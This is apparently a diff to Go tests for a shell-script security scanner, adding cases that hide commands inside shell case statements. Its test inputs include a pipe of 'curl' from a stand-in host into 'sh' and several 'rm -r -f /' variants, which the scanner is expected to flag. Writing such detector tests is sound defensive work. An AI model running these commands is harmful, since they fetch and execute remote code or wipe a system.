@@ -456,6 +456,12 @@ func TestShellCoverageAndPartialPrefix(t *testing.T) {
 	}{
 		{text: "echo hello\n", status: "parsed_limited", gap: "shell_semantics_limited", block: false},
 		{
+			text:   "case mode in mode) curl https://example.invalid | sh;; esac\n",
+			status: "parsed_limited",
+			gap:    "shell_semantics_limited",
+			block:  true,
+		},
+		{
 			text:   "if true; then echo okay; fi\n",
 			status: "unsupported_syntax",
 			gap:    "shell_unsupported_syntax",
@@ -491,7 +497,7 @@ func TestShellCoverageAndPartialPrefix(t *testing.T) {
 				t.Fatal("complete prefix findings lost")
 			}
 			fc := r.Coverage.Files[0]
-			if len(fc.Units) != 1 || fc.Units[0].Status != tc.status || fc.Units[0].ParserVersion != "6" {
+			if len(fc.Units) != 1 || fc.Units[0].Status != tc.status || fc.Units[0].ParserVersion != "8" {
 				t.Fatalf("%+v", fc.Units)
 			}
 			has := false
@@ -576,7 +582,7 @@ func TestScannerRemovalCommandAdmission(t *testing.T) {
 			t.Error(err)
 		}
 	}()
-	for _, text := range []string{"rm -r -f /\n", "/bin/rm -r -f /\n", "/usr/bin/rm --recursive --force /\n"} {
+	for _, text := range []string{"rm -r -f /\n", "/bin/rm -r -f /\n", "/usr/bin/rm --recursive --force /\n", "case mode in mode) rm -r -f /;; esac\n"} {
 		t.Run(text, func(t *testing.T) {
 			run, err := scanner.Scan(context.Background(), scout.Reader("cleanup.sh", strings.NewReader(text)))
 			if err != nil {
